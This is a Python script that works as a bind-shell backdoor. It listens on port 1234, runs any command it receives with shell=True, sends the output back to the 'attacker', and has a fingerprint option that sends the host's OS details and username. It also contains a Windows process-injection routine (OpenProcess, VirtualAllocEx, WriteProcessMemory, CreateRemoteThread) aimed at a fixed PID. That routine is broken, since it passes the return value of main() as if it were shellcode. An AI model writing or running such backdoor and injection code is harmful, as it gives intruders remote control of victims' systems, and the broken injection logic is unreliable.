from ctypes import *
import sys
import socket
import subprocess
import os
import platform

pid = 1500
    
section = 0x40 #Section of memory that stores the shell code
access = 0x1F0FFF #Opens a handle into the process that we target
memAllocate = 0x00001000 #Allocates and zeroes memory upon writing
kernel32 = windll.kernel32 #Just a single variable for that call

hostname = socket.gethostname()
target =  socket.gethostbyname('0.0.0.0') #resolves to ipv4(can be changed)
p = int(1234) #makes second argument to integer for port

def main():
    global c
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
    #s.bind((target,p)) #bind to target ip and port
    s.bind((target, p))
    s.listen(10) 
    c, a = s.accept() #accept connection
    
    while True:
        textRecieved = c.recv(1024).decode('utf-8') #converts recieve data to plaintext
        
        #change director command directly in the os
        if textRecieved[:2] == 'cd':
            os.chdir(textRecieved[3:])
        
        if textRecieved[:3] == '-fp':   
            fingerPrint()
            
        if len(textRecieved) > 0:
            cmd = subprocess.Popen(textRecieved[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #sets command parameters for the streams to open
            bytes = cmd.stdout.read() + cmd.stderr.read()#for sending to the attacker
            string = str(bytes, 'utf-8') #more readable text
            c.send(str.encode(string + str(os.getcwd()) + '>')) #sends working directory back to attacker to look like terminal
    
    c.close()

def fingerPrint():
    sysInfo = platform.uname()

    c.send(str.encode('Fingerprint: '+ '\n' +
        'OS: ' + sysInfo[0] + '\n' +
        'Node: ' + sysInfo[1] + '\n' +
        'Release: ' + sysInfo[2] + '\n' +
        'Version: ' + sysInfo[3] + '\n' +
        'Machine: ' + sysInfo[4] + '\n' +
        'Processor: ' + sysInfo[5] + '\n' +
        'User: ' + os.environ['USERNAME']  
        ))

shellcodeLength = len(main()) #yes

processHandle = kernel32.OpenProcess(access, False, pid) #Returns a handle into our target process

memoryAll = kernel32.VirtualAllocEx(processHandle, 0, shellcodeLength, memAllocate, section) #Allocates memory to a remote process

kernel32.WriteProcessMemory(processHandle, memoryAll, main(), shellcodeLength, 0) #Writes the shellcode to an area of memory within our target process

kernel32.CreateRemoteThread(processHandle, None, 0, memoryAll, 0, 0, 0) #Creates a thread within another process